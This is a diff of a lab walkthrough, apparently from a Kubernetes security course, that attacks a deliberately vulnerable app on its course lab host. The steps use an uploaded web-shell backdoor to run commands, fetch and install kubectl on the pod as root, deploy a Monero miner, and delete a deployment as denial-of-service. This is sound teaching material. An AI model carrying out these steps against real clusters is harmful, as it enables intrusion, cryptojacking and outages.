@@ -75,7 +75,6 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
             return p.stdout.decode()
         ...
     ```
-    <!-- - try to browse [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get Unauthorized -->
     - upload the payload via `curl`:
     ```sh
     TOKEN=<your token>
@@ -84,6 +83,8 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
     [![UFU upload shell](../static/03-application-security/09-file-upload.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=57m12s)
 
     - try again [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get the backdoor shell
+    [![Use shell: ls](../static/03-application-security/10-shell-ls.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=57m29s)
+
     - since the server is in Debug mode, it auto-reloads without restarting the pod
 
 12. use the backdoor to install `kubectl` (note again: the pod is running Ubuntu as `root`) by navigating to `http://images.vulnerable-app.seck8s.slurm.io/?cmd=...`:
@@ -93,14 +94,18 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
         - `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"`
         - `install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl`
     - `kubectl get all`
+    [![Use shell: kubectl](../static/03-application-security/11-shell-kubectl.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=58m42s)
 
 13. note, the pod's SA has only permissions on Deployments -- it's done by mistake by another developer who accidentally gave extra permissions to the default service account in the namespace `vulnerable-app` (see [vulnerable-app/another-app/deploy/rbac.yaml](vulnerable-app/another-app/deploy/rbac.yaml))
 
 14. now, let's deploy a miner:
     - use the web form [http://images.vulnerable-app.seck8s.slurm.io/?token=...](http://images.vulnerable-app.seck8s.slurm.io/?token=...) to upload the miner's manifest [payloads/monero-deployment.yaml](payloads/monero-deployment.yaml) (note: you need to use the admin JWT token again)
     - use the backdoor to: `kubectl apply -f images/monero-deployment.yaml`
+    [![Use shell: run miner](../static/03-application-security/12-shell-miner.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=1h00m36s)
+
 
 15. or shut down the cluster's payload (Deployment only, permitted by RBAC): `kubectl delete deployment auth-api`
+    [![Use shell: denial-of-service](../static/03-application-security/13-shell-dos.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=1h01m11s)
 
 16. cleanup:
     ```sh
